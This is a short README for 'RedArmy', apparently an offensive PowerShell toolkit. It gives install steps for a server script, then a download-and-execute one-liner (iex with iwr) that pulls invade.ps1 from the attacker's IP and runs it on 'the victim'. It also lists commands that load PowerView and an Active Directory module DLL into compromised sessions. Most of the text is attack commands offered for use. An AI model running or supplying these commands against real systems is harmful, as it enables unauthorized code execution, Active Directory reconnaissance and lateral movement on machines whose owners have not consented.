# RedArmy

## Installation

```
$ git clone https://gitlab.com/mjwhitta/redarmy.git
$ cd ./redarmy
$ git submodule update --init --recursive
$ ./serve [--port PORT] [--update] <ip>
```

## Usage

Once the `serve` script is running, you can use the following to load
RedArmy on the victim:

```
PS> iex (iwr -DisableKeepAlive -UseBasicParsing http://<ip>:<port>/invade.ps1)
```

That command will also displayed for you to copy and paste for
convenience. Finally, you can deploy tools with commands like:

```
PS> iex (Get-PowerView) # Load ps1 script into current session
PS> Deploy-PowerView <session> # Load ps1 script into session

PS> Get-ADModuleDLL # Load DLL object into current session
PS> Deploy-ADModuleDLL <session> # Load DLL object into session
```
